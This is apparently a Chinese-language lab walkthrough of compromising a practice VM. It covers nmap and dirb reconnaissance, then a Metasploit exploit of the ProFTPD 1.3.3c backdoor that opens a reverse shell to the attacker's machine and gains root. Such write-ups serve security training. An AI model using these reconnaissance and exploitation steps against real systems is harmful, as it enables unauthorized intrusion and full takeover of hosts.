# 信息收集

## Nmap

开启kali用扫同网段，找到该虚拟机ip，同时扫描开放端口：

```
nmap -sn 192.168.111.0/24
nmap --min-rate 10000 -p- -Pn  192.168.111.139
nmap -sT -sC -sV -O -p21,22,80 192.168.111.139 
```

![截图](61bf4da2f8b63b7a71fe33b111f64655.png)

![截图](86071098f5b4d5e2781363fd6c5d1a94.png)

![截图](1bb4aee26845ff2d7f5eb5f33dcd135c.png)

## Web - 80

![截图](dfebaafeea3e3387f898f8fd011aa41f.png)

提示没有添加任何内容

### 目录 - FUZZ

```
dirb http://192.168.111.139
```

![截图](ce01dcefcedc7b85ff7daf0f11893ecb.png)

无可用信息

## PORT - 21

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.3c
```

Google搜索发现存在漏洞，我们使用msf进行利用。

# 漏洞利用

```
msfconsole
search ProFTPd-1.3.3c
```

![截图](7cde8e9a160929b346ba302d40442185.png)

```
use 0
show options
set RHOSTS 192.168.111.139    //设置RHOSTS为靶机ip地址
set payload cmd/unix/reverse
set LHOST 192.168.111.128    //设置监听ip为kali的IP
```

![截图](d00966ae09f01f396ff6ff71311b7c77.png)

```
exploit
```

![截图](2e05f80df51891e1a58669d2e38eadc0.png)

攻击成功，成功拿到root权限